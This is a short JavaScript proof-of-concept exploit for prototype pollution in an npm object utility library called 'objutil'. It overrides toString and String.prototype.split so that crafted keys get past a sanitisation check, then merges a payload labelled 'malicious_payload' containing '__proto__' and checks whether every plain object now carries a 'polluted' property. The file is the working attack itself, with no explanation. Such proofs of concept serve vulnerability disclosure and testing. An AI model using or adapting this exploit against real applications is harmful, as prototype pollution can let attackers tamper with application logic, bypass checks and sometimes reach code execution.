var arg1 = ['constructor'];
var arg2 = ['prototype'];
var flag1 = true;
var flag2 = true;
arg1.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return 'constructor';
    }
};
arg2.toString = function () {
    if (flag2) {
        flag2 = false;
        return 'foo';
    } else {
        return 'prototype';
    }
};
String.prototype.split = function () {
    return [
        arg1,
        arg2,
        'polluted'
    ];
};
const {merge, remove} = require('objutil');
let a = {
    x: 1,
    y: {
        w: 1,
        z: 2
    }
};
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
result = merge(a, JSON.parse(malicious_payload));
console.log({}.polluted);